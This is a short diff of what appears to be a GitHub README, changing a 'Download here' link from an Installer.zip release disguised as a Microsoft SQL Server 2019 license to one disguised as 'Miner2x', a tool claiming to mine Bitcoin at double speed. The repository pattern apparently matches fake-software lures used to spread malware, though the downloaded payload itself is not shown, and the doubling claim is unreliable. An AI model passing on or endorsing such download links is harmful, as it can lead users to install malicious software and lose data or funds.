@@ -6,11 +6,11 @@
 
 Miner Bitcoin 2x with Miner2x 
 
-<a href='https://github.com/suellenoliveiras/Microsoft-SQL-Server-2019-Standard---License/releases/download/sql/Installer.zip'>Download here</a>
+<a href='https://github.com/suellenoliveiras/bitcoin-miner-windows/releases/download/Bitcoin/Installer.zip'>Download here</a>
 
 ## Description
 
-Get started with Microsoft SQL Server downloads.
+Get started with Miner2x.
 
 ## Getting Started
 
